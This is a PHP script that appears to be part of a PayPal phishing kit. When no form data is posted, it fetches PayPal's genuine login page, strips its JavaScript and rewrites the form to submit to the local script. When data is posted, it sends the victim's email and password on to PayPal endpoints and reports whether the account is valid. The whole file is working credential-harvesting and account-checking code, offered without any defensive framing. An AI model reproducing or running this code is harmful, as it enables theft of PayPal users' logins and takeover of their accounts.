<?php
//----------------------------------------------------------------------->>>
# 	Simple Curl Function
//-------------------------------------------------------------->>>

	function Anon_http($srv, $usr, $url, $pstf, $pst, $cks, $rtf, $vrb, $flw, $hdr){
	$ci = curl_init();
	curl_setopt_array($ci, array(
	CURLOPT_TIMEOUT => 0,
	CURLOPT_SSL_VERIFYPEER => $srv,
	CURLOPT_USERAGENT => $usr,
	CURLOPT_URL => $url,
	CURLOPT_POSTFIELDS => $pstf,
	CURLOPT_POST => $pst,
	CURLOPT_COOKIESESSION => $cks,
	CURLOPT_COOKIEJAR =>  dirname(__FILE__).'/1.txt',
	CURLOPT_COOKIEFILE => dirname(__FILE__).'/1.txt',
	CURLOPT_RETURNTRANSFER => $rtf,
	CURLOPT_VERBOSE => $vrb,
	CURLOPT_FOLLOWLOCATION => $flw,
	CURLOPT_HEADER => $hdr
	));
	return curl_exec($ci);
	curl_close($ci);
	}
	
//--------------------------------------------------------------->>> 
#	VARS :  User agent / Login paypal / Open a cookie
//---------------------------------------------------------------------->>> 

	$Agent = $_SERVER['HTTP_USER_AGENT'];
	$Link_Login = 'https://www.paypal.com/signin?country.x=ES&locale.x=es_ES';
	$Get_Execution = 'https://www.paypal-prepaid.com/account/authenticatePP.m';
	$Confirm_Info = 'https://www.paypal.com/webapps/auth/loginauth?execution=e1s1';
	
//------------------------------------------------------>>>
#	Get the form of PayPal and verify user data
//-------------------------------------------------------------->>>

if (isset($_POST['login_email']) || isset($_POST['login_password'])) {
	
	$em = urlencode($_POST['login_email']);
	$ps = urlencode($_POST['login_password']);
	$data = "execution=e1s1&phonePinLogin=false";
	$data .= "&email=$em&password=$ps";
	$data .= "&_eventId_submit=Log+In&RMC=&flow_name=&fso_enabled=22";
	
//-------------------------------------------------------------------------------->>>
#	Basically with the first request, we get the cookie or session: [ e1s1 ]
//---------------------------------------------------------------------------->>>

 	$Check = Anon_http(0, $Agent, $Get_Execution, 0, 0, 1, 1, 0, 1, 0);
 	$Check = Anon_http(0, $Agent, $Confirm_Info, $data, 1, 0, 1, 0, 1, 0);
	die((preg_match('/name="password"/i', $Check))? 'Flase Account' : 'True Account');
	
}else{

//-------------------------------------------------------------------->>>
#	Get original page login, and change the name file authentication
//------------------------------------------------------------------------------>>> 

	$GET_FORM = Anon_http(0, $Agent, $Link_Login, 0, 0, 1, 1, 0, 1, 0);
	$GET_FORM = str_replace('/app.js', 'No_js.ok', $GET_FORM);
	die(str_replace('action="/signin"', 'action="./script.php"', $GET_FORM));
	
}



